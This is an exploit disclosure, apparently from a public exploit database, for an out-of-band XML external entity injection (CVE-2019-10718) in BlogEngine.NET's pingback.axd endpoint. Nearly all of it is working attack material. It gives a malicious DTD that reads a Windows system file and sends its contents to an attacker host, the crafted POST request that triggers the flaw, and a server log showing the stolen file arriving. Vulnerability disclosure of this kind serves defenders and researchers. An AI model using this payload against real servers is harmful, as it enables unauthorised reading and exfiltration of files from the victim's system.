# Exploit Title: Out-of-band XML External Entity Injection on BlogEngine.NET
# Date: 
# Exploit Author: Aaron Bishop
# Vendor Homepage: https://blogengine.io/
# Version: v3.3.7
# Tested on: 3.3.7, 3.3.6
# CVE : 2019-10718

1. Description
==============

BlogEngine.NET is vulnerable to an Out-of-Band XML External Entity Injection attack on **/pingback.axd**.

2. Proof of Concept
=============

Host the following malicious DTD on a web server that is accessible to the target system:

~~~
<!ENTITY % p1 SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/X?%p1;'>"> %p2
~~~

Submit a request to `pingback.axd` containing a malicious XML body:

~~~{command="REQUEST"}
POST /pingback.axd HTTP/1.1
Host: $RHOST
Accept-Encoding: gzip, deflate
Connection: close
User-Agent: python-requests/2.12.4
Accept: */*
Content-Type: text/xml
Content-Length: 131

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://$LHOST/ex.dtd">
<foo>&e1;</foo>
<methodName>pingback.ping</methodName>
~~~

The application will request the remote DTD and submit a subsequent request containing the contents of the file:

~~~
$RHOST - - [17/May/2019 12:03:32] "GET /ex.dtd HTTP/1.1" 200 -
$RHOST - - [17/May/2019 12:03:32] "GET /X?<r:b>;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1</r:b> HTTP/1.1" 200 -
~~~
